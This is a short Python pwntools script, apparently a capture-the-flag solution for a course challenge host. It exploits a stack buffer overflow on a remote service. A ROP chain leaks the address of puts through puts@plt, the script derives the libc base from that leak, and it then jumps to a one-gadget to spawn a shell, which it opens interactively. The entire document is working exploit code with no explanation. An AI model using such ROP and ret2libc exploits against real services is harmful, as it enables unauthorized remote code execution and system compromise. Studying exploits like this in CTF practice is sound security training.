from pwn import *

r = remote('csie.ctf.tw', 10127)

puts_plt = 0x4004a0
puts_got = 0x601018
main = 0x4005b7

pop_rdi = 0x400673

payload = 'a'*16
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendline(payload)
r.recvuntil('\n')

puts = r.recvuntil('\n').strip().ljust(8, '\x00')
puts = u64(puts)

libc_puts = 0x0809c0
libc_one_gadget = 0x04f2c5
libc_base = puts - libc_puts
shell = libc_base + libc_one_gadget
print('puts: ' + hex(puts))
print('libc Base: ' + hex(libc_base))
print('One Gadget: ' + hex(shell))

payload = 'a'*16 + p64(shell)

r.sendline(payload)
r.interactive()
r.close()
